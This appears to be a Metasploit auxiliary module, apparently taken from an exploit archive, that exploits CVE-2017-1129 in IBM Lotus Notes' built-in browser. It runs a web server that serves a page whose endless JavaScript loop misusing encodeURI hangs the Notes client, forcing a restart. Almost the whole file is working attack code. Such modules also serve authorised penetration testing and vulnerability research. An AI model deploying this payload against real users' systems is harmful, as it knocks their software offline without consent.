# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer
 
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => "IBM Notes encodeURI DOS",
        &#039;Description&#039;    => %q(
          This module exploits a vulnerability in the native browser that
comes with IBM Lotus Notes.
          If successful, it could cause the Notes client to hang and have
to be restarted.
        ),
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         => [
          &#039;Dhiraj Mishra&#039;,
        ],
        &#039;References&#039;     => [
          [ &#039;EXPLOIT-DB&#039;, &#039;42602&#039;],
          [ &#039;CVE&#039;, &#039;2017-1129&#039; ],
          [ &#039;URL&#039;, &#039;
http://www-01.ibm.com/support/docview.wss?uid=swg21999385&#039; ]
        ],
        &#039;DisclosureDate&#039; => &#039;Aug 31 2017&#039;,
        &#039;Actions&#039;        => [[ &#039;WebServer&#039; ]],
        &#039;PassiveActions&#039; => [ &#039;WebServer&#039; ],
        &#039;DefaultAction&#039;  => &#039;WebServer&#039;
      )
    )
  end
 
  def run
    exploit # start http server
  end
 
  def setup
    @html = %|
    <html><head><title>DOS</title>
<script type="text/javascript">
while (true) try {
                var object = { };
                function d(d0) {
                        var d0 = (object instanceof encodeURI)(&#039;foo&#039;);
                }
                d(75);
        } catch (d) { }
</script>
</head></html>
    |
  end
 
  def on_request_uri(cli, _request)
    print_status(&#039;Sending response&#039;)
    send_response(cli, @html)
  end
end

